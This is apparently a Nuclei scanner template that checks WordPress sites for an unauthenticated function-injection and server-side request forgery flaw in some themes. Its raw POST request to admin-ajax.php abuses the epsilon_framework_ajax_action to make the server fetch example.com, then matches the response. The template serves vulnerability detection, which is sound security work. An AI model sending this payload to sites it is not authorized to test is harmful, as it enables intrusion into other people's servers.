id: wp-multiple-theme-ssrf
info:
  author: madrobot
  name: WordPress Multiple Themes - Unauthenticated Function Injection
  severity: high
  tags: wordpress,rce,ssrf
requests:
- matchers:
  - part: body
    type: word
    words:
    - Example Domain
    - protocol_version
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=action_name HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Content-Length: 158

    Connection: close


    action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://example.com

    '
